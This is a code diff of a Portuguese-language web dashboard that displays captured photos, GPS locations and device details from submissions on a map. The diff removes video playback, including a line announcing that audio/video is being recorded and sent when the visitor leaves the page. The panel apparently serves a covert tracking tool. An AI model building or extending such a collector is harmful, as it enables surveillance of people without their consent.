@@ -116,16 +116,8 @@
       border: 1px solid #e2e8f0;
     }
 
-    .video-player {
-      width: 100%;
-      border-radius: 8px;
-      background: #000;
-      max-height: 220px;
-      outline: none;
-    }
-
     .popup-media {
-      width: 100%; max-width: 220px; border-radius: 8px; margin-top: 6px;
+      width: 100%; max-width: 200px; border-radius: 8px; margin-top: 6px; cursor: zoom-in;
     }
 
     #map { flex: 1; height: 100vh; }
@@ -210,7 +202,7 @@
       </div>
 
       <div class="historico-section">
-        <h3>📜 Capturas, Vídeos e Localizações</h3>
+        <h3>📜 Capturas e Localizações</h3>
         <div id="lista-historico">
           <p style="text-align: center; color: #6b7280; margin-top: 20px;">Aguardando envios...</p>
         </div>
@@ -372,11 +364,9 @@
           const dataFormatada = dataObj.toLocaleDateString('pt-BR');
           const horaFormatada = dataObj.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
-          const mediaPopupHtml = item.video 
-            ? `<video src="${item.video}" controls playsinline poster="${item.foto || ''}" class="popup-media">Seu navegador não suporta vídeo.</video>`
-            : (item.foto 
-                ? `<img src="${item.foto}" class="popup-media" onclick="abrirModalFoto('${item.foto}')" title="Clique para ampliar" />` 
-                : `<p style="font-size:11px; color:#6b7280;">Sem foto/vídeo</p>`);
+          const mediaPopupHtml = item.foto 
+            ? `<img src="${item.foto}" class="popup-media" onclick="abrirModalFoto('${item.foto}')" title="Clique para ampliar" />` 
+            : `<p style="font-size:11px; color:#6b7280;">Sem foto</p>`;
 
           const enderecoTexto = item.endereco || 'Endereço aguardando/não registrado';
           const disp = item.dispositivo || {};
@@ -417,12 +407,6 @@
             ? `<img src="${item.foto}" class="item-foto-thumb" title="Clique para ampliar" onclick="event.stopPropagation(); abrirModalFoto('${item.foto}')" />`
             : `<div class="item-foto-thumb" style="display:flex;align-items:center;justify-content:center;font-size:10px;color:#64748b;">Sem foto</div>`;
 
-          const videoPlayerHtml = item.video ? `
-            <video src="${item.video}" controls playsinline poster="${item.foto || ''}" class="video-player" onclick="event.stopPropagation();">
-              Seu navegador não suporta reprodução de vídeo.
-            </video>
-          ` : `<p style="font-size:11px; color:#6366f1; margin:0; font-weight: 500;">🔴 Gravando áudio/vídeo... (Será enviado ao fechar/sair da página)</p>`;
-
           const coordsText = item.lat ? `📍 Lat: ${item.lat.toFixed(4)}, Lng: ${item.lng.toFixed(4)} (±${Math.round(item.precisao)}m)` : '📍 Aguardando coordenadas GPS...';
 
           card.innerHTML = `
@@ -437,7 +421,6 @@
               </div>
             </div>
             ${dispInfoHtml}
-            ${videoPlayerHtml}
           `;
 
           card.querySelector('.btn-deletar').addEventListener('click', (e) => {
